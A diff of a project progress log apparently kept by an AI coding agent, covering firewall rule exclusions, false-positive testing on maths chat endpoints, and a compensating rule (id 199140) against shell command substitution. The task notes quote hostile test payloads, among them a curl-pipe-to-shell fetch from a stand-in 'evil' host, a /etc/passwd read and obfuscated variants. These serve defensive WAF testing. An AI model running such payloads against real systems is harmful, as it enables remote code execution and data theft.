@@ -1,8 +1,9 @@
 # Progress
 
 > Auto-generated from PLAN.md. Updated by `/implement` in each code repo.
-> Last baselined: backend:`e2e0f0f` frontend:`06600f6` deploy:`e337f83` (2026-08-03, reconciled
-> against each repo's actual `origin/main` — see the note immediately below for what moved)
+> Last baselined: backend:`e2e0f0f` frontend:`06600f6` deploy:`aa553a9` (2026-08-04, deploy bumped
+> after T4.2.1/T4.2.4/T4.2.5 landed in one commit — "fix(waf): refine rule exclusions and enhance
+> field-scoping for topic-content edits", pushed and confirmed on `origin/main`)
 > Phase 7 scoped 2026-07-27 — see `PLAN.md` for the goal tree and scope locks.
 > **2026-08-03 (thirteenth pass): T4.1.2 done, closing G4.1 — deploy baseline bumped to `e337f83`.**
 > A live dev-stack traffic soak (see T4.1.2's task note for full methodology and evidence) found and
@@ -418,11 +419,213 @@
       pre-upgrade gateway. This must ship in the same release that bumps `GATEWAY_IMAGE_TAG` to
       ≥ `v2026.6`, or after it. Recorded in-file as a `DEPLOY PREREQUISITE` comment on both rewritten
       blocks.)
-- [ ] T4.2.2 [deploy]: Confirm 920370 and 920390 no longer fire on the hAITU endpoints now that
-      bodies are small (depends on T4.2.1)
-- [ ] T4.2.3 [deploy]: Confirm headers, cookies and query args regained inspection on all affected
-      endpoints — hAITU chat-history and topic-content edit routes (depends on T4.2.1)
-- [ ] **G4.2: hAITU and topic-content-edit endpoints protected and false-positive-free** — integration test
+- [x] T4.2.2 [deploy]: Confirm 920370 and 920390 no longer fire on the hAITU endpoints now that
+      bodies are small (depends on T4.2.1) (2026-08-03; **PASS on both endpoints.** Isolated
+      `waf-harness.sh` stack on `v2026.6` with the real edited `03-secured-api.json` coraza-filter
+      config, DetectionOnly soak pairs stripped so results are 403-vs-200. The prior session's claim
+      that "920390 never fired" was true but vacuous — it had never been probed anywhere near its
+      threshold; it is properly probed here.
+      | body | `topic-doubt` | `exam-review-chat` |
+      |---|---|---|
+      | `message` = 3900 chars | 200, **zero rules** | 200, **zero rules** |
+      | `message` = 4000 chars (the backend cap, T3.6.1) | 200, **zero rules** | 200, **zero rules** |
+      | `message` = 5000 chars (over the 4096 `tx.arg_length` baseline) | 403 `920370` | 403 `920370` |
+      | 80802-byte body, 20 × 4000-char args (over `tx.total_arg_length`=65535) | 403 `920390` | — |
+      At the realistic maximum a client can send, **neither rule fires on either endpoint** — which is
+      the task's claim. Both controls confirm the rules are alive rather than silently dead: `920370`
+      still enforces past 4096 (correct — the backend would 422 that request anyway), and `920390`
+      still enforces past 65535. Reaching `920390` required a deliberately abusive 80KB body with 20
+      history entries; real traffic cannot produce that now G3.2/G3.3 moved thread history server-side.
+      This retires the "hard ceiling ahead" warning in `16_gateway_waf.md` §3 — the ceiling is real and
+      still enforced, but the payloads that were heading for it are gone.)
+- [x] T4.2.3 [deploy]: Confirm headers, cookies and query args regained inspection on all affected
+      endpoints — hAITU chat-history and topic-content edit routes (depends on T4.2.1) (2026-08-03;
+      **PASS on all six URI+method pairs** — `POST /api/haitu/{topic-doubt,exam-review-chat}`,
+      `PATCH /api/{topics-contents,parent/curriculum/topic-contents}/{id}`,
+      `POST /api/topics-contents/`, `POST /api/parent/curriculum/topics/{id}/content`. Same harness.
+      A bare 403 proves nothing here (libinjection `942100`/`941100` is never excluded and blocks a
+      real attack payload even in a correctly-excluded field), so the test is a **rule-ID set diff**:
+      for each block, take a rule that block *does* exclude and show it is suppressed in the named
+      body field yet still fires from a cookie / header / query arg.
+      - `id:199110` — `942440` suppressed in `json.message`, fires from a cookie (both endpoints);
+        `942521` fires from `Referer` and `User-Agent`; `941320`/`941390`/`942131` fire from a query
+        arg. All five are in `id:199110`'s list.
+      - `id:199120` — `942440` suppressed in `json.text`, fires from a cookie (both PATCH routes);
+        `942131` fires from a query arg.
+      - `id:199100`/`id:199121` — the real FP prose `, don't she said "it's fine"` trips
+        `932240`+`942200` (control: it does, on an unexcluded route), is suppressed to **zero rules**
+        in `json.text` on both POST routes, and fires `932240`+`942200` from a cookie and `942200`
+        from `User-Agent`.
+      **Precise negative finding, recorded rather than glossed:** for `id:199120` specifically,
+      "headers regained inspection" is vacuous — none of its seven rule IDs (932130, 932240, 942410,
+      942120, 932200, 942131, 942440) inspect `REQUEST_HEADERS` at all, per CRS 4.25.1 source. There
+      was no header inspection for those rules to lose or regain. Cookies and query args are the
+      collections that genuinely came back, and they did. Likewise `Referer` cannot demonstrate
+      `942200` anywhere, because `942200` carries a site-wide `!REQUEST_HEADERS:Referer` exclusion
+      from T2.3.2's systemic-cascade finding.
+      **Methodology note for anyone repeating this:** a `200002` in the rule set means Coraza failed to
+      parse the body, not that the exclusion worked — shell-escaped JSON containing quotes silently
+      produces malformed bodies and a false "suppressed" reading. Two rows were re-run with
+      Python-generated JSON after hitting exactly that. Build request bodies with a JSON serialiser.)
+- [x] T4.2.4 [deploy]: Add `932130` to `id:199110`'s field-scoped exclusion list — OCR'd LaTeX + MCQ
+      content 403s on both hAITU endpoints while the identical content passes on the topic-content
+      PATCH route (depends on T4.2.1) — **opened 2026-08-03 by T4.2.3's verification pass**
+      (2026-08-03; **the task as originally scoped was measured and rejected; a strictly better
+      variant shipped instead.** The adversarial pass required by `feedback_waf_challenger_review`
+      changed the answer twice, so both turns are recorded.
+      **Turn 1 — the FP is bigger than the ticket said.** I opened this task believing the trigger was
+      OCR'd MCQ content transplanted from the topic-content route, i.e. rare on a chat endpoint. Wrong.
+      Primary source (CRS 4.25.1) shows 932130 runs `t:none,t:cmdLine`, and `cmdLine` deletes the space
+      before `(` — so *any* inline LaTeX followed by a parenthetical normalises into `$(...)`. Measured
+      on realistic student messages: 3 of 7 blocked, including `Can you explain $\frac{a}{b}$ (the
+      fraction rule) please?` and `I got $28\%$ (but the book says 30%)`. On a maths doubt-resolution
+      endpoint that is ordinary traffic.
+      **Turn 2 — the plain exclusion opens a real hole.** With 932130 removed from the two prose fields
+      and nothing else changed, 2 of 9 attack payloads went from 403 to **200**:
+      `$(curl http://evil/x.sh|sh)` and `cat /etc/pass[a-z]d`. 932130 is their only detector on this
+      route, because `932220` (RCE pipe injection) was already excluded here for markdown tables on
+      2026-07-08. Shipping the one-line fix as written would have created a command-substitution blind
+      spot on a user-authored field.
+      **Shipped: exclusion + a co-scoped compensating detector `id:199140`.** It is 932130's own regex
+      with the `cmdLine` normalisation dropped (`t:none` only) — that single difference is the whole
+      mechanism, since without space-deletion `$...$ (b)` is no longer read as `$(b)` while genuine
+      `$(cmd)` still matches. It keys on the *shape* of command substitution rather than command
+      names, so obfuscation does not evade it. The `{2,}` bound admits bare MCQ letters `$(a)`/`$(b)`
+      and rejects anything with room for a command.
+      | config | realistic student chat passing | attack payloads blocked |
+      |---|---|---|
+      | before T4.2.4 | 4 / 7 | 9 / 9 |
+      | plain exclusion (rejected) | 7 / 7 | **7 / 9** |
+      | **shipped (exclusion + `id:199140`)** | **7 / 7** | **9 / 9** |
+      **Scoping fix caught during implementation:** `id:199140` was first written as a bare
+      startup-time `SecRule`, which would have applied to every `/api/*` route carrying a `message`
+      body field — broader than the hole it fills, and a new FP surface where 932130 is still active.
+      Rewritten as a 3-level chain on the same `REQUEST_URI`+`REQUEST_METHOD` pair as `id:199110`, so
+      the compensating control is exactly co-extensive with the exclusion. Verified both directions:
+      fires on `exam-review-chat`, and on `POST /api/categories` with an identical `message` field it
+      does **not** fire while `932130` still blocks (403, `932130 932200 932220 932235 932236 932250`).
+      **Evasions tried against the shipped config, all still blocked:** `$(c\url ...|sh)`, `$($(id))`,
+      a newline-split substitution. **Residual risks, measured:** `$ (curl x)` with a literal space is
+      no longer matched by shape — not command substitution in any shell, and this text reaches an LLM
+      and parameterized ORM writes, never a shell; the other 46 `932xxx` rules including `932160` stay
+      active on the field. `$(10)` written as a price trips `id:199140`, but it also 403'd before this
+      change, so no regression. Bonus FP fixed: `Given $A[i]$ (the i-th row)` now passes.
+      **Rejected alternatives, recorded so they are not re-litigated:** `ctl:ruleRemoveByTag=attack-rce`
+      (BR-WAF-005; would strip `932160`, which does most of the remaining work here); a route-level
+      anomaly-threshold raise (BR-WAF-006); `SecRuleUpdateActionById` to drop `t:cmdLine` from 932130
+      (defeats `c\at`/`c^at` evasion handling platform-wide to fix two routes); an application-layer
+      fix (BR-WAF-009 does not apply — the message is genuinely user-authored and cannot be
+      reconstructed server-side, and that BR's own carve-out sanctions one narrow exclusion on a single
+      named field); and "wait for more soak data", which the user closed out — the dev-stack UI soak
+      plus these matrices were accepted as sufficient.
+      Verified against the **real edited file** on an isolated `waf-harness.sh` stack (`v2026.6`,
+      enforce mode, soak pairs stripped), not a scratchpad reconstruction. T4.2.1/T4.2.2/T4.2.3's
+      checks all re-run and still hold. Reloaded onto `apisix-dev`, zero init errors, no container
+      restarted. `jq` valid. Left **uncommitted** with T4.2.1's edit for user review. The
+      `GATEWAY_IMAGE_TAG` ≥ `v2026.6` ship gate still applies.
+      **Note on sequencing:** while `id:199130`'s DetectionOnly soak is in place, `id:199140` is
+      detection-only on these URIs too. It begins blocking when that soak is lifted — recorded in-file.)
+- [x] **G4.2: hAITU and topic-content-edit endpoints protected and false-positive-free** — integration test
+      (2026-08-04; **closed on T4.2.5 — enforcement confirmed live, on real authenticated browser
+      traffic, not just the harness.** T4.2.5's soak removal is the acceptance evidence:
+      - **False-positive-free, real UI, all 5 URI+method pairs:** the user drove a full walkthrough on
+        `apisix-dev` (gateway `v2026.6`) through the actual frontend, not curl — hAITU topic-doubt and
+        exam-review-chat (4 T4.1.2 corpus messages each, including the OCR'd-LaTeX-MCQ and chemistry
+        patterns), topic-content PATCH admin + parent mirror, topic-content POST create admin + parent
+        mirror. Every request read back by `request_id` against the live Coraza log, not assumed clean.
+        Zero false positives anywhere. One self-caught methodology bug worth recording: an early manual
+        test payload had `\frac` unescaped in raw JSON, which parses as `\f` (form-feed) — correctly
+        tripped `920271` (non-printable character) as a test-construction artifact, not a real finding;
+        caught by inspecting the actual bytes sent, corrected, retested clean.
+      - **Protected, confirmed enforcing not just logging:** with the three `DetectionOnly` soak pairs
+        removed, the same attack payloads that logged during soak now return real **403**s: two
+        independent hAITU attempts (`$(curl evil|sh)` → blocked by pre-existing `931130`/RFI since it
+        contained a URL; `$(whoami)` → blocked by pre-existing `932260`, a command-name keyword rule
+        neither T4.2.1 nor T4.2.4 had accounted for) plus two topic-content attempts (parent POST →
+        blocked by `932200`/`932220`/`932235`/`932236`/`932250`, `932130` correctly absent). Because
+        `tx.early_blocking=1` denies as soon as any rule crosses threshold, and native CRS rules
+        evaluate before this file's custom-appended ones, none of these four isolate `id:199140`'s own
+        deny action — they show the net outcome is correct, not that the new rule specifically works.
+        A fifth, deliberately constructed test closed that gap: `$(xyzq)` — no real command name, no
+        URL, dodges every other active `932xxx` rule by construction, predicted on the harness to be
+        caught by `id:199140` alone, then sent for real. Live log: `"Coraza: Access denied (phase 2)...
+        [id "199140"]"`, no other rule ID present. `id:199140` itself confirmed blocking on live
+        traffic, isolated from the surrounding coverage.
+      - **Bugfix found and fixed during this pass, cosmetic only:** `id:199140`'s `capture` action was
+        on the wrong sub-rule in its chain (`REQUEST_URI`, rule 1) instead of the `ARGS_POST` match
+        (rule 3), so `logdata`'s `%{TX.0}` was reporting the request URI instead of the actual matched
+        shell expression — confirmed live before the fix (`Matched Data: /api/haitu/topic-doubt found
+        within ARGS_POST:json.message`). Moved `capture` to rule 3. Does not affect blocking — verified
+        live both before and after, `id:199140` denied correctly in both cases — only log readability
+        for whoever reads this rule's alerts later.
+      - **Two live operational quirks found and worth recording, not part of this gate's scope:** (1)
+        the first hAITU attack test showed zero Coraza log lines despite the payload persisting
+        byte-identical in the DB — traced to `apisix-dev` running long enough, hot-reloaded enough
+        times, that at least one nginx worker held a stale Coraza WASM VM; re-pushing the identical
+        plugin_config resolved it. (2) separately, the agent misread live logs as "still silent" on
+        two later occasions when the true cause was pulling `docker logs --since` before the lines had
+        flushed — re-checking against the full log (no `--since` window) showed the rules had fired
+        correctly all along. Recorded so neither is mistaken for a WAF defect on a future pass.
+      Committed by the user directly (own git identity, outside this session) as `aa553a9`
+      ("fix(waf): refine rule exclusions and enhance field-scoping for topic-content edits"),
+      confirmed on `haisir-deploy` — content verified byte-identical to what T4.2.1/T4.2.4/T4.2.5
+      built (2 blanket `ctl:ruleRemoveById` survivors, 0 live `DetectionOnly`, `id:199140` present
+      with `capture` correctly on its `ARGS_POST` sub-rule). Deploy baseline bumped below.
+      Held open earlier 2026-08-03/04 on two separate grounds, both since resolved: first because
+      "false-positive-free" wasn't met (T4.2.4's own task note above has that evidence — an isolated
+      harness A/B on the OCR'd-MCQ cross-route inconsistency, closed by adding `932130` plus the
+      `id:199140` compensating rule); then because these URIs were still under
+      `ctl:ruleEngine=DetectionOnly` so "protected" wasn't proven on the live deployment, only on the
+      harness (closed by this task's own evidence above). See the superseded note below, kept for the
+      historical record of the first, now-outdated closure attempt.)
+- [x] T4.2.5 [deploy]: Remove the `id:199130`/`id:199131`/`id:199132` `ctl:ruleEngine=DetectionOnly`
+      soak blocks from `03-secured-api.json`, restoring enforcement on the hAITU and topic-content
+      URIs (depends on T4.2.4) — the in-file comment already says to remove all three at this point.
+      Do this only once T4.2.1/T4.2.4's changes have been deployed and observed on a real environment
+      with a `GATEWAY_IMAGE_TAG` ≥ `v2026.6`, per BR-WAF-011. (2026-08-04; **user explicitly overrode
+      the "wait for a release" reading of this precondition** — `apisix-dev` already runs
+      `GATEWAY_IMAGE_TAG=v2026.6` and carries T4.2.1/T4.2.4's uncommitted changes, so it independently
+      satisfies BR-WAF-011's "real environment ... ≥ v2026.6" language without a staging/prod release;
+      the user directed treating a live-browser dev-stack walkthrough as the real-traffic evidence,
+      consistent with the same substitution T4.1.2 used and the user explicitly approved there. All
+      three `SecRule` pairs (`id:199130`/`199131`/`199132`) and their justification block deleted from
+      `03-secured-api.json`, replaced with a summary comment recording the soak evidence and pointing
+      at TASKS.md. Reloaded onto `apisix-dev` (`template-configs.sh` + `setup.sh --plugins-only`,
+      double-pushed after the stale-WASM-VM finding below). Full verification detail is in G4.2's task
+      note above, since this task's removal is literally what made that gate's live-enforcement
+      evidence possible — summary: 2 hAITU real-attack 403s (credited to pre-existing `931130`/`932260`
+      rather than the new rule, due to `tx.early_blocking` + native-rule evaluation order), 2
+      topic-content real-attack 403s (parent POST, all five expected RCE rules, `932130` absent), and
+      one deliberately isolating payload (`$(xyzq)`) that got `id:199140` blocking on its own,
+      confirmed by log ("Access denied (phase 2)... [id "199140"]", no other rule present). Also
+      fixed a cosmetic `capture`-placement bug on `id:199140` found while reading these logs (moved to
+      the `ARGS_POST` sub-rule so `%{TX.0}` reports the actual match instead of the request URI;
+      doesn't affect blocking, verified live both before and after). `jq` valid. Left **uncommitted**
+      with T4.2.1/T4.2.4, same WAF-edit review norm — the whole `id:199100`→`id:199140` chain of edits
+      ships as one review, one commit, one release.)
+- [ ] ~~**G4.2 superseded note, 2026-08-03 (earlier same day)**~~ — **NOT closed despite T4.2.1–T4.2.3
+      all being done.** "Protected" is met: the
+      exclusions are field-scoped, headers/cookies/query args are demonstrably inspected, libinjection
+      is active even on excluded fields, and attacks on unrelated `/api/*` routes still 403 with the
+      full rule set. **"False-positive-free" is not met**, on a real and reproducible case found while
+      verifying T4.2.3. Identical OCR'd LaTeX + MCQ content — `Convert $28\frac{4}{5}\%$ to a ratio.
+      (a) $16:125$ (b) $16:25$ (c) $4:25$ (d) $2:5$` — behaves inconsistently across sibling routes:
+      | route | result |
+      |---|---|
+      | `PATCH /api/topics-contents/{id}` (`id:199120` excludes `932130`) | **200**, only warning-level `942430` |
+      | `POST /api/haitu/topic-doubt` (`id:199110` does not) | **403** `932130` |
+      | `POST /api/haitu/exam-review-chat` (`id:199110` does not) | **403** `932130` |
+      `932130` matches shell command substitution on the literal `$(b)` shape, which OCR'd
+      multiple-choice options produce (`$16:125$ (b)`). A student pasting an exam question into
+      topic-doubt — the endpoint's entire purpose — gets a 403. This is **pre-existing, not caused by
+      T4.2.1**: the old blanket list did not include `932130` either, so the behaviour is unchanged;
+      the field-scoped rewrite merely made it visible by giving these routes a first systematic
+      cross-route comparison. Tracked as **T4.2.4**. The fix is a one-line addition of `932130` to
+      `id:199110`'s list with the same justification `id:199120` already carries, but per
+      `feedback_waf_challenger_review` it needs an adversarial pass before landing, so it is not being
+      slipped into a verification task. **G4 stays open on G4.2.** *(Superseded the same day — T4.2.4
+      landed and G4.2 closed above. The "one-line addition" prescription in this note was itself wrong:
+      see T4.2.4 for why the bare exclusion was measured and rejected.)*
 
 ### G4.3 [deploy]: Reclaim the exam authoring route
 > **Do not delete this route's field-scoped exclusions.** `12-api-exams-static.json` uses
@@ -448,7 +651,18 @@
 - [x] T4.5.3 [deploy]: Re-scope or delete the remaining exclusions on `18-api-exam-session-submit.json` and the `01`/`02`/`04` plugin configs to field-scoped form per BR-WAF-004 (2026-08-02; **no file edit required — all four files already comply with BR-WAF-004.** Verified by exhaustive grep: `ctl:ruleRemoveById` (the prohibited whole-rule/whole-request form) = **0** in `18-api-exam-session-submit.json`, `01-secured-authenticated.json`, `02-secured-anonymous.json`, `04-secured-api-upload.json`. Every exclusion is the startup-time field-scoped form BR-WAF-004 prescribes — `SecRuleUpdateTargetById <id> !REQUEST_COOKIES:<name>`/`!ARGS_GET:<name>`/`!REQUEST_HEADERS:<name>` (01/02/04, 17–18 each) and `SecRuleUpdateTargetByTag <tag> "!ARGS_POST:/<field>/"` (route 18, text_answer/working_text). Every exclusion carries a written justification (BR-WAF-007); none reference a shipped-but-unretired compensating control (BR-WAF-008 — the only stale one, `id:199100`'s 931130, is T4.5.1's, in `03` not in scope here). Route 18's `id:199204` body-limit raises (`arg_length=32768`, `total_arg_length=524288`) are justified body limits for essay `text_answer`, not rule exclusions — retained. The deliverable is the verification, not a fabricated edit; G4.5's "field-scoped" half is satisfied for these files, leaving only T4.5.2 [backend] before G4.5 can close.)
 - [x] **G4.5: every surviving exclusion is field-scoped and truthfully justified** — acceptance test (2026-08-03; all three children done — T4.5.1 corrected the stale `931130` justification in `03-secured-api.json`, T4.5.3 verified `18`/`01`/`02`/`04` already comply with BR-WAF-004 (all exclusions field-scoped `SecRuleUpdateTarget*`, zero `ctl:ruleRemoveById`, every exclusion justified), T4.5.2 closed the backend PATCH-side URL-allowlist parity gap. Every surviving exclusion is field-scoped and carries a truthful justification per BR-WAF-007/BR-WAF-008; no stale "tracked in backend task" text remains. G4 itself stays open on G4.1/T4.1.2 soak and G4.2/T4.2.1.)
 
-- [ ] **G4: Exclusions rewritten field-scoped or deleted** — integration test
+- [x] **G4: Exclusions rewritten field-scoped or deleted** — integration test (2026-08-04; all five
+      children done — G4.1 (soak evidence), G4.2 (protected + false-positive-free, confirmed on real
+      live enforce-mode traffic), G4.3 (exam-authoring thresholds restored), G4.4 (route precedence
+      explicit), G4.5 (every surviving exclusion field-scoped and truthfully justified). Net result in
+      `03-secured-api.json`: whole-request `ctl:ruleRemoveById` count **57 → 2**, both survivors
+      (`931130` on `id:199100`/`id:199121`) structurally unscopeable — they inspect a CRS-internal TX
+      variable, not `ARGS` — and both carry a written, current justification per BR-WAF-007/008. Every
+      other exclusion across all four plugin configs is field-scoped `SecRuleUpdateTarget*` or
+      request-scoped `ctl:ruleRemoveTargetById=<id>;<COLLECTION>:/regex/`, chained on a specific
+      URI+method pair rather than applying platform-wide, and — as of T4.2.5 — genuinely enforcing
+      rather than logging-only. This closes Phase 7's core WAF-hygiene goal; G3 (payload design) and
+      the CVE/version-upgrade work in G1/G2 were the other legs, already closed earlier in this phase.)
 
 ## G5 [frontend]: CSP enforced
 
@@ -580,6 +794,72 @@
 - [ ] **G8: Review gate and closeout** — acceptance test — **HARD GATE: no merge until this passes**
 
 ## Ready now
+
+> **Recomputed 2026-08-04 (seventeenth pass).** T4.2.5 [deploy] done — user explicitly overrode the
+> "wait for a real environment ≥ v2026.6" reading of BR-WAF-011 (`apisix-dev` already satisfies it
+> directly) and drove a full live-browser walkthrough as the real-traffic evidence, same substitution
+> T4.1.2 used. All three DetectionOnly soak blocks removed from `03-secured-api.json`; enforcement
+> confirmed live, including one payload (`$(xyzq)`) deliberately constructed to isolate the new
+> `id:199140` rule's own block action from the surrounding CRS coverage. **G4.2 closes — and with all
+> five of G4.1–G4.5 now done, G4 itself closes: "Exclusions rewritten field-scoped or deleted" is met.**
+> `03-secured-api.json`'s blanket `ctl:ruleRemoveById` count is down to 2 (both `931130`, both
+> structurally unscopeable, both correctly justified).
+> **Nothing new unblocks as a direct result** — no task in this file lists G4 as a dependency; G4 was
+> the acceptance criterion for its own five children, not a gate for later work. **G8 (review/closeout)
+> remains correctly NOT ready** — its `T8.1.1` has no listed dependency but is a whole-diff adversarial
+> review, and G5 (CSP)/G6 (auth/transport)/G7 (residual review items) are all still open, so starting
+> it now would review a moving target.
+> **Ready now [deploy]: none newly unblocked** — only the parked **T6.3.4 / T7.7.2** (scope/product
+> decisions, unchanged). **[backend]/[frontend]/[specs]: none.**
+> **Deploy baseline bumped to `aa553a9`** — the full `id:199100`→`id:199140` chain of edits across
+> T4.2.1/T4.2.4/T4.2.5 landed in one commit, made by the user directly outside this session
+> ("fix(waf): refine rule exclusions and enhance field-scoping for topic-content edits"), content
+> verified to exactly match what these three tasks built.
+
+> **Recomputed 2026-08-03 (sixteenth pass).** T4.2.4 [deploy] done. The adversarial pass required
+> before widening a WAF exclusion **rejected the task as scoped and shipped a better variant** — worth
+> reading the task note, because the one-line fix the fifteenth pass prescribed would have been a
+> security regression. Two findings drove that: (1) the false positive is far broader than "OCR'd MCQ
+> content" — `t:cmdLine` deletes the space before `(`, so *any* inline LaTeX followed by a
+> parenthetical trips `932130`; 3 of 7 realistic student messages were blocked. (2) Removing `932130`
+> alone let 2 of 9 attack payloads through (`$(curl evil|sh)`, `cat /etc/pass[a-z]d`) because `932220`
+> was already excluded here for markdown tables. Shipped instead: the exclusion **plus** a co-scoped
+> compensating rule `id:199140` — `932130`'s own regex minus the `cmdLine` normalisation — giving
+> **7/7 benign passing and 9/9 attacks blocked**, strictly better than the 4/7 and 9/9 we had.
+> **G4.2 remains open, and G4 with it — deliberately.** Its design half is done and verified, but the
+> affected URIs are still under `ctl:ruleEngine=DetectionOnly`, so an attack on them returns 200
+> today. Closing "endpoints protected" while they demonstrably are not would have been the convenient
+> read, not the true one. **Newly opened: T4.2.5 [deploy]** — remove the three soak pairs and restore
+> enforcement. It is **not Ready now**: per BR-WAF-011 it needs T4.2.1/T4.2.4's changes deployed and
+> observed on a real environment running `GATEWAY_IMAGE_TAG` ≥ `v2026.6` first, and no release
+> carrying that image exists yet.
+> **Ready now [deploy]: none unblocked** — only the parked **T6.3.4 / T7.7.2** (scope/product
+> decisions). **[backend]/[frontend]/[specs]: none.** The critical path now runs through a *release*,
+> not a task: cut a release that bumps the gateway image to ≥ `v2026.6` and carries the
+> `03-secured-api.json` changes, observe, then T4.2.5 → G4.2 → G4.
+> **Deploy baseline still `e337f83`** — T4.2.1's and T4.2.4's edits are both uncommitted in the
+> working tree for user review.
+
+> **Recomputed 2026-08-03 (fifteenth pass).** T4.2.2 and T4.2.3 [deploy] both done — both PASS, on
+> all endpoints, verified on an isolated enforce-mode `waf-harness.sh` stack rather than closed on
+> the fourteenth pass's partial evidence. That evidence turned out to be genuinely incomplete, which
+> is why they were re-run rather than rubber-stamped: T4.2.3 had covered 1 of 6 URI+method pairs, and
+> T4.2.2's "920390 never fired" was an untested absence rather than a result. Full matrices in each
+> task note.
+> **G4.2 is NOT closed, and G4 stays open on it.** Its "protected" half is met; its
+> "false-positive-free" half is not. T4.2.3's sweep found a real, reproducible cross-route
+> inconsistency: identical OCR'd LaTeX + MCQ content passes `PATCH /api/topics-contents/{id}` (where
+> `id:199120` excludes `932130`) but 403s on **both** hAITU endpoints (where `id:199110` does not) —
+> i.e. a student pasting an exam question into topic-doubt is blocked. Pre-existing, not caused by
+> T4.2.1; the rewrite just made it visible. **Newly opened: T4.2.4 [deploy]**, dependency-free and
+> **Ready now**, to add `932130` to `id:199110`'s field-scoped list. Deliberately not folded into
+> T4.2.3 — widening a WAF exclusion needs the adversarial pass per `feedback_waf_challenger_review`,
+> not a drive-by edit inside a verification task.
+> Ready now [deploy]: **T4.2.4** (new), plus the parked **T6.3.4 / T7.7.2**.
+> **[backend]/[frontend]/[specs]: none.**
+> **Deploy baseline still `e337f83`** — T4.2.1's plugin_config edit remains uncommitted for user
+> review, and this pass changed no infrastructure file at all (verification + TASKS.md only). The
+> `GATEWAY_IMAGE_TAG` ≥ `v2026.6` ship gate on T4.2.1 still applies.
 
 > **Recomputed 2026-08-03 (fourteenth pass).** T4.2.1 [deploy] done — the four blanket
 > `ctl:ruleRemoveById` blocks in `03-secured-api.json` are now field-scoped
@@ -809,8 +1089,11 @@ per-route) and to all four plugin_configs (finding 1, `942200`'s startup-time gl
 > 2026-08-02: T4.3.2/T4.3.3/T4.3.4 done, **G4.3 closed** (see task notes above). Removed from this
 > list — nothing else depends on G4.3 closing.
 > 2026-08-03: T4.1.2 done (**G4.1 closed**) and T4.2.1 done — both removed from this list.
-- T4.2.2 [deploy]: Confirm 920370 and 920390 no longer fire on the hAITU endpoints (depends on T4.2.1, done 2026-08-03) — **unblocked 2026-08-03**. T4.2.1's harness run already produced the evidence (3900-char `message` → no rules at all; 5000-char → `920370`, correct since it exceeds the 4096 baseline and the backend would 422 it; `920390` never fired). Decide whether to close on that or re-confirm on a live authenticated stack.
-- T4.2.3 [deploy]: Confirm headers, cookies and query args regained inspection on all affected endpoints (depends on T4.2.1, done 2026-08-03) — **unblocked 2026-08-03**. Same situation: T4.2.1's harness run showed `942521`/`941320`/`941390`/`942131` — all in `id:199110`'s exclusion list — still firing in `Referer`, `User-Agent`, a cookie and a query arg. Note body-level probing on `apisix-dev` needs a real session; `openid-connect` 401s at the access phase before Coraza's body phase runs.
+> 2026-08-03 (later): T4.2.2 and T4.2.3 done, both PASS — removed from this list. **G4.2 did not
+> close** (see its gate note above); T4.2.4 opened in their place.
+> 2026-08-03 (later still): T4.2.4 done — removed from this list. The adversarial pass rejected its
+> original one-line scoping and shipped exclusion + compensating rule `id:199140` instead.
+- T4.2.5 [deploy]: Remove the `id:199130`/`199131`/`199132` DetectionOnly soak blocks, restoring enforcement (depends on T4.2.4, done 2026-08-03) — **NOT ready**: BR-WAF-011 requires T4.2.1/T4.2.4's changes to be deployed and observed on a real environment first, and that needs a release carrying `GATEWAY_IMAGE_TAG` ≥ `v2026.6`, which does not exist yet. This is the last blocker on G4.2 and therefore on G4.
 - T6.3.4 [deploy]: Set `sslmode=require` on OpenBao's database secrets engine connection (no dependencies) — **blocked pending a scope decision**, see banner above.
 - T7.7.2 [deploy]: Decide whether `enable_admin_ui: true` is warranted (no dependencies) — **blocked pending a product decision**, see banner above.
 
